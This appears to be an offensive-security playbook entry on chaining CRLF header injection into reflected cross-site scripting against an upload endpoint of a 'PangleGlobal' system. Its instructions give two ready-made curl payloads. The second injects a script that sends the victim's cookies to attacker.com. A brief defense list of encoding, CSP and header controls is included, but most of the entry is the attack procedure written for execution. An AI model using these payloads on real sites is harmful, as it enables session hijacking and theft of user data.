---
tags:
  - xss
  - reflected-xss
  - header-injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-crlf-injection-test]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f79394fb-692c-4c44-bdf2-066b4b7df119
created_at: '2025-12-13T23:55:37.778Z'
updated_at: '2025-12-13T23:55:37.778Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Headers for Reflected XSS

## Summary

This procedure exploits CRLF injection to add a custom Content-Type header, forcing the response to be interpreted as HTML and reflecting a JavaScript payload for cross-site scripting (XSS) execution in the victim's browser.

## Description

Building on CRLF injection, this injects a 'Content-Type: text/html' header followed by a body containing an unescaped <script> tag. The Pangle endpoint reflects the 'file_name' input without HTML escaping, allowing arbitrary JavaScript execution. Target environment is web browsers accessing the internal PangleGlobal system. Prerequisites: Confirmed CRLF vuln and ability to craft payloads. Outcomes include script execution, potentially leading to session theft or data exfiltration.

## Requirements

1. Confirmed CRLF injection capability from prior procedure
2. Victim context (e.g., shared link or internal access)
3. Browser for payload testing or proxy for simulation

## Defense

Defensive measures and detection strategies:

- Enforce output encoding (e.g., HTML entity encoding) on all reflected data
- Set strict Content-Type headers server-side and ignore client attempts
- Implement Content Security Policy (CSP) to block inline scripts
- Log and alert on suspicious Content-Type manipulations

## Objectives

1. Force HTML interpretation via header injection
2. Execute JavaScript in the browser context
3. Demonstrate impact on user sessions

## Instructions

### Step 1: Craft XSS Payload with Header Injection

**Context**: Use CRLF to inject a Content-Type header and embed a script in the body.

**Command** ([[commands/curl-crlf-injection-test]]):
```bash
curl -X POST 'https://pangle-endpoint.example.com/upload' -d 'file_name=xss%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert("XSS%20via%20CRLF")</script>' -v
```

> The response should include the injected HTML. When loaded in a browser, the alert fires, confirming XSS.

### Step 2: Test in Browser Context

**Context**: Simulate victim access by loading the response in a browser to verify execution.

**Command** ([[commands/curl-crlf-injection-test]]):
```bash
curl -X POST 'https://pangle-endpoint.example.com/upload' -d 'file_name=reflect%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>' --output xss.html
```

> Save output to HTML file and open in browser. Expected: Redirect or data exfil to attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-crlf-injection-test]]

## Tools Used


## Tags

- [[xss]]
- [[javascript-injection]]
